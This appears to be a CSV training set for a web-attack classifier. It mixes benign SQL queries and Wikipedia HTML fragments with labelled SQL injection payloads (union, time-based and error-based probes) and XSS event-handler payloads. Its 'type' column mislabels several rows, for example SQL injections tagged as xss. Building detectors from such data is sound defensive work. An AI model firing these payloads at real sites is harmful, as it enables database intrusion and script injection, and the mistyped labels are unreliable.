Text,Label,type
SELECT * FROM gather WHERE watch BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, p.&#160;24 </li>",0,xss
"1   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  4924  =  4924",1,sql
"	 </span> <span class=""toctext"">Economics ",0,xss
"<li><a href=""/wiki/Electric_unicycle"" title=""Electric unicycle"">Electric unicycle </a> </li>",0,xss
"<menuitem onbeforecopy=""alert(1)"" contenteditable>test</menuitem>",2,xss
SELECT * FROM baby,0,sql
<noembed onpointerup=alert(1)>XSS</noembed>,2,xss
SELECT * FROM front WHERE wise = 'earn',0,sql
"<style>:target {transform: rotate(180deg);}</style><s id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></s>",2,xss
"<li><a href=""/wiki/Frame_problem"" title=""Frame problem"">Frame problem </a> </li>",0,xss
-2569' union all select 4484--,1,sql
"c/ cardenal cisneros 58,",0,sql
tes6a485n,0,sql
1'  )   and 7533  =  7533 and   (  'dbjq'  =  'dbjq,1,sql
"<marquee draggable=""true"" ondragleave=""alert(1)"">test</marquee>",2,xss
1'+  (  select 'vjoj' where 5348  =  5348,1,sql
4271,0,xss
SELECT COUNT ( characteristic ) FROM shorter,0,sql
"perdign, el",0,xss
1   )    )     )   or sleep  (  5  )  #,1,sql
SELECT bigger ( s )  FROM rough SELECT reach ( s ) ,0,sql
"  SELECT * FROM layers WHERE mostly NOT IN  ( 'roof', 'rain', 'soon' )  ",0,sql
"<h4><span class=""mw-headline"" id=""Anti-logic_or_scruffy"">Anti-logic or scruffy ",0,xss
cocina_r,0,sql
marketa,0,sql
"1%""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1,sql
"c/ mineria, 151 13?g",0,sql
SELECT * FROM progress WHERE pilot = 'chain'  AND  ( mountain = 'involved' OR meal = 'went' ) ,0,sql
"1%'   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
"<a onmousemove=""alert(1)"">test</a>",2,xss
<bgsound onpointerenter=alert(1)>XSS</bgsound>,2,xss
 </li>,0,xss
"1""   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""msjh"" like ""msjh",1,xss
"1""  )   where 9062  =  9062",1,sql
SELECT AVG ( notice ) FROM sets,0,sql
"-2111' union all select 1061,1061,1061--",1,xss
" SELECT * FROM art ORDER BY carried, herself",0,xss
"1'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'ckfn' like 'ckfn",1,sql
-3339' or 8571  =  8571--,1,sql
aul,0,sql
19185,0,sql
-3462'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'cxku' like 'cxku,1,sql
"	 </span> <span class=""toctext"">The limits of artificial general intelligence ",0,xss
prado de la guzpea,0,sql
-7636'  )   or 5898  =  8880 and   (  'sjuv'  =  'sjuv,1,sql
SELECT * FROM board  WHERE eleven = expression,0,sql
SELECT * FROM buffalo WHERE Price NOT BETWEEN 10 AND 20,0,xss
7613,0,sql
SELECT SEC_TO_TIME ( 1 ) ;,0,sql
SELECT TOP 50 PERCENT * FROM realize,0,sql
"<style>@keyframes slidein {}</style><img style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></img>",2,xss
"   SELECT date, final, cupFROM composition WHERE ground  IS NOT NULL",0,sql
dehr,0,sql
"<em onkeypress=""alert(1)"" contenteditable>test</em>",2,xss
"<style>:target {color:red;}</style><body id=x style=""transition:color 1s"" ontransitionend=alert(1)></body>",2,xss
"1""  )   where 4878  =  4878 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",1,xss
750,0,sql
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,1,sql
SELECT * FROM acres WHERE began = 'who' FETCH FIRST 3 ROWS ONLY,0,xss
	 </span>,0,xss
SELECT AVG ( Price ) FROM deal,0,sql
SELECT TOP 3 * FROM constantly SELECT * FROM outer 3SELECT * FROM consider,0,sql
SELECT Count ( * )  AS remember,0,sql
SELECT * FROM put  WHERE yet = exchange,0,sql
1.76476E+15,0,sql
	 </span></a></dt><dd>Learn how to use Python’s builtin logging on Scrapy.</dd>,0,xss
-2348  )   as sige where 1639  =  1639 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,sql
select   (  case when   (  1227  =  4014  )   then 1227 else 1227*  (  select 1227 from mysql.db  )   end  )  #,1,sql
horgan,0,sql
"SELECT * FROM call WHERE fix BETWEEN ""whether"" AND    ""locate""",0,sql
emesh,0,sql
SELECT * FROM improve FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM gift,0,sql
5953,0,sql
SELECT said FROM cloud UNION ALL SELECT rocket FROM satisfied ORDER BY new,0,sql
"-1550%""   )    )     )   order by 1--",1,xss
"<li id=""cite_note-Eleanor-315""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Eleanor_315-0"">^ </a> </b> ",0,xss
celio,0,xss
SELECT * FROM map  WHERE depth = leather,0,sql
guerra_russinov@weat.fj,0,sql
5856,0,sql
corera,0,sql
"1""  )   as frmp where 6073  =  6073",1,sql
"<big onbeforecut=""alert(1)"" contenteditable>test</big>",2,xss
" SELECT * FROM judge ORDER BY means, flow",0,sql
garek,0,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,xss
or 'unusual'   =   'unusual',1,sql
SELECT * FROM of  WHERE unknown = shout,0,xss
"<section ondblclick=""alert(1)"">test</section>",2,xss
"<li><a href=""/wiki/Property_dualism"" title=""Property dualism"">Property dualism </a> </li>",0,xss
"-5925  )   where 5758  =  5758 union all select 5758,5758,5758,5758,5758,5758,5758,5758,5758#",1,sql
"-3349   )    )     )   union all select 6553,6553#",1,sql
0m24gu1l39,0,sql
tabanera de cerrato,0,sql
" SELECT * FROM threw ORDER BY stood, manner",0,sql
SELECT * FROM mix WHERE    NOT die = 'ask',0,sql
SELECT * FROM shoulder WHERE NOT minute = 'appropriate'  AND NOT among = 'win',0,sql
"<style>@keyframes slidein {}</style><style style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></style>",2,xss
"<div draggable=""true"" contenteditable>drag me</div><button ondragover=alert(1) contenteditable>drop here</button>",2,xss
"  SELECT examineID AS ID, seen AS cabin FROM add",0,xss
"<div role=""note"" class=""hatnote navigation-not-searchable"">Further information: <a href=""/wiki/Artificial_intelligence_arms_race"" title=""Artificial intelligence arms race"">Artificial intelligence arms race </a>, <a href=""/wiki/Lethal_autonomous_weapon"" title=""Lethal autonomous weapon"">Lethal autonomous weapon </a>, and <a href=""/wiki/Unmanned_combat_aerial_vehicle"" title=""Unmanned combat aerial vehicle"">Unmanned combat aerial vehicle </a> </div>",0,xss
<dfn id=x tabindex=1 ondeactivate=alert(1)></dfn><input id=y autofocus>,2,xss
eberto,0,xss
"<li><a href=""/wiki/AI_box"" title=""AI box"">AI box </a> </li>",0,xss
"c/ gallarza, 147",0,sql
<bdi id=x tabindex=1 onbeforedeactivate=alert(1)></bdi><input autofocus>,2,xss
"1""  )   as pxdq where 2236  =  2236 and 2006  =  2006",1,sql
 ,0,xss
"1%""  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"<li><a href=""/wiki/Computational_chemistry"" title=""Computational chemistry"">Computational chemistry </a> </li>",0,xss
37711,0,sql
kinsman,0,sql
<tr onpointerout=alert(1)>XSS</tr>,2,xss
SELECT her ( s )  FROM fox UNION ALL,0,sql
"  SELECT TIME ( ""19:30:10"" ) ;",0,xss
SELECT Count ( * )  AS sitting,0,sql
5900,0,sql
"		<li id=""footer-places-contact""><a href=""//en.wikipedia.org/wiki/Wikipedia:Contact_us"">Contact Wikipedia </a> </li>",0,xss
1 where 8214  =  8214 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,xss
SELECT * FROM garage WHERE Price NOT BETWEEN 10 AND 20,0,xss
"   SELECT within, badly+ ', ' + whistle+ ' ' + entire+ ', ' + plenty AS avoid  FROM does",0,sql
19432,0,sql
<footer id=x tabindex=1 ondeactivate=alert(1)></footer><input id=y autofocus>,2,xss
"<div draggable=""true"" contenteditable>drag me</div><u ondragover=alert(1) contenteditable>drop here</u>",2,xss
      </div>,0,xss
 </li>,0,xss
"1   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   4686  =  4686",1,xss
	 </span> </li>,0,xss
SELECT * FROM spite FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"  SELECT DATE_SUB ( ""2017-06-15"", INTERVAL 10 DAY ) ;",0,sql
<h1 onpointerout=alert(1)>XSS</h1>,2,xss
"<li><a href=""/wiki/Problem_of_other_minds"" title=""Problem of other minds"">Problem of other minds </a> </li>",0,xss
"<spacer onbeforecut=""alert(1)"" contenteditable>test</spacer>",2,xss
SELECT COUNT ( fifth )  FROM at,0,sql
" select * from users where id  =  1 or 1#""{ union select 'a',version  (    )   -- 1",1,sql
13750,0,xss
"	 </span> <span class=""reference-text""><cite id=""CITEREFTuring1948"" class=""citation""><a href=""/wiki/Alan_Turing"" title=""Alan Turing"">Turing, Alan </a> (1948), ""Machine Intelligence"",  in Copeland, B. Jack (ed.), <i>The Essential Turing: The ideas that gave birth to the computer age </i>, Oxford: Oxford University Press, p.&#160;412, <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-19-825080-7"" title=""Special:BookSources/978-0-19-825080-7""><bdi>978-0-19-825080-7 </bdi> </a> </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=Machine+Intelligence&amp;rft.btitle=The+Essential+Turing%3A+The+ideas+that+gave+birth+to+the+computer+age&amp;rft.place=Oxford&amp;rft.pages=412&amp;rft.pub=Oxford+University+Press&amp;rft.date=1948&amp;rft.isbn=978-0-19-825080-7&amp;rft.aulast=Turing&amp;rft.aufirst=Alan&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"1"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""mbas""  =  ""mbas",1,sql
"<svg onpaste=""alert(1)"" contenteditable>test</svg>",2,xss
SELECT AVG ( push ) FROM write,0,xss
<frame onblur=alert(1) tabindex=1 id=x></frame><input autofocus>,2,xss
alberuela de tubo,0,sql
SELECT * FROM master FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM chair,0,sql
"1""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  ""whld""  =  ""whld",1,sql
"Emotion and <a href=""/wiki/Affective_computing"" title=""Affective computing"">affective computing </a>:",0,xss
SELECT * FROM east WHERE tropical BETWEEN '1996-07-01' AND '1996-07-31',0,sql
fonz,0,sql
" SELECT * FROM electric ORDER BY mainly, sort",0,sql
?revivir,0,xss
"1%""  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""%""  =  """,1,xss
"1' where 2373  =  2373 union all select null,null#",1,sql
SELECT TOP 3 * FROM stay SELECT * FROM until 3SELECT * FROM bar,0,sql
SELECT * FROM nothing WHERE indeed = 'mass'  AND City = 'life',0,xss
"<style>:target {color: red;}</style><fieldset id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></fieldset>",2,xss
SELECT * FROM snow WHERE rising = 'stand'  OR better = 'bear',0,sql
SELECT * FROM green FETCH FIRST 50 PERCENT ROWS ONLY,0,xss
zool7ic1,0,sql
SELECT area ( s )  FROM seems UNION ALL,0,sql
"1""  )   union all select null,null,null,null--",1,sql
"1""  )   as zopq where 2680  =  2680",1,sql
document.scripts.length,2,xss
SELECT option_value FROM wp_options WHERE option_name  =  'kc_tkl_cc' LIMIT 1,0,sql
santa eullia de ronana,0,sql
gueldos donohue,0,sql
-2797'   )    )     )   union all select 5711#,1,xss
indamira,0,xss
raysa,0,sql
"ignacio aldecoa, 30, 6h",0,sql
"<a href=""/wiki/State_space_search"" title=""State space search"">State space search </a> and <a href=""/wiki/Automated_planning_and_scheduling"" title=""Automated planning and scheduling"">planning </a>:",0,xss
"<IMG SRC=# onmouseover=""alert('xxs')"">",2,xss
"<div draggable=""true"" contenteditable>drag me</div><track ondragover=alert(1) contenteditable>drop here</track>",2,xss
</div>,0,xss
1  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  1073  =  1073,1,sql
A few of the people who make some form of the argument:,0,xss
header('Location: '.$_GET['param']);,2,xss
"-3234%""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""%""  =  """,1,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Science&amp;rft.atitle=Superhuman+AI+for+heads-up+no-limit+poker%3A+Libratus+beats+top+professionals&amp;rft.pages=418-424&amp;rft.date=2018-01-26&amp;rft_id=info%3Adoi%2F10.1126%2Fscience.aao1733&amp;rft.aulast=Brown&amp;rft.aufirst=Noam&amp;rft.au=Sandholm%2C+Tuomas&amp;rft_id=http%3A%2F%2Fscience.sciencemag.org%2Fcontent%2F359%2F6374%2F418&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"-8754""   )    )     )   union all select 7391,7391,7391,7391,7391,7391,7391--",1,sql
-9893' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'pbop'  =  'pbop,1,xss
levi@coivoco.gr,0,sql
	 </span> 2007 ,0,xss
SELECT * FROM this  WHERE flag NOT LIKE '[get]%',0,sql
SELECT * FROM collect WHERE newspaper BETWEEN '1996-07-01' AND '1996-07-31',0,sql
2.38947E+15,0,xss
"  SELECT fifth,split,stream FROM member LEFT JOIN Orders ON together.additionalID =  sad.small ORDER BY copy.gray",0,sql
SELECT AVG ( pilot ) FROM larger,0,sql
-9742  )   where 8409  =  8409 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,sql
"<ul><li><a href=""/wiki/Chipless_RFID"" title=""Chipless RFID"">Chipless RFID </a> </li> </ul> </li>",0,xss
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""ymss""  =  ""ymss",1,sql
1  )   as qywz where 1864  =  1864 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,sql
"-4528""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""fxmt"" like ""fxmt",1,sql
jodie,0,sql
<address id=x tabindex=1 ondeactivate=alert(1)></address><input id=y autofocus>,2,xss
	 </span>,0,xss
1'+  (  select tdkt where 4535  =  4535,1,xss
"1'   )    )     )   union all select null,null,null,null,null--",1,sql
"1   )    )    as rsnb where 3168  =  3168 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,xss
"1""  )   as gjlv where 1983  =  1983 and sleep  (  5  )  #",1,sql
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_3086' LIMIT 1,0,sql
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c888b6771b' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,sql
<article onpointerover=alert(1)>XSS</article>,2,xss
"<li><a href=""/wiki/Mental_representation"" title=""Mental representation"">Mental representation </a> </li>",0,xss
SELECT tears FROM people UNION SELECT aware FROM directly ORDER BY settle,0,sql
SELECT AVG ( for ) FROM verb SELECT SUM ( drink ) ,0,sql
1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,1,sql
1%'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   '%'  =  ',1,sql
